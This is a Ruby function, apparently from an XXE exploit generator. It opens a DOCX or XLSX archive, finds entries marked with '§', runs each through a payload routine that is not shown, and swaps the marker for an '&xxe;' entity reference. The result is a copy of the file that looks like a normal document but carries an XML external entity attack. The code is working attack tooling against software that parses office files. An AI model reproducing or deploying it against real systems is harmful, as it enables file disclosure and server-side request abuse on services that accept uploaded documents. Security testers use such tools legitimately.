# encoding: ASCII-8BIT
# The string replacement functionality
def find_string(payloadx, i)
  payloadx = select_payload unless payloadx

  puts "|+| Checking for § in #{@options['file']}..."

  p payloadx

  targets = []
  Zip::Archive.open(@options['file'], Zip::CREATE) do |zipfile|
    n = zipfile.num_files # gather entries

    n.times do |i|
      nm = zipfile.get_name(i)
      zipfile.fopen(nm) do |f|
        document = f.read # read entry content
        if document =~ /§/
          puts "|+| Found § in #{nm}, replacing with &xxe;"
          targets.push(nm)
        end
      end
    end
  end

  if targets.size == 0
    puts '|-| Could not find § in document, please verify.'
    return
  end

  # get file ext
  ext = @options['file'].split('.').last
  nname = "output_#{Time.now.to_i}_all"
  rand_file = "./output/#{nname}_#{i}.#{ext}"
  FileUtils::copy_file(@options['file'], rand_file)

  puts "|+| Inserting into #{rand_file}"

  targets.each do |target|

    document = ''
    # Read in the XLSX and grab the document.xml
    Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
      zipfile.fopen(target) do |f|
        document = f.read # read entry content
      end
    end

    docx_xml = payload(document,payloadx)

    # replace string
    docx_xml = docx_xml.gsub('§', '&xxe;')

    Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
      zipfile.add_or_replace_buffer(target,
                                    docx_xml)
    end
  end
end
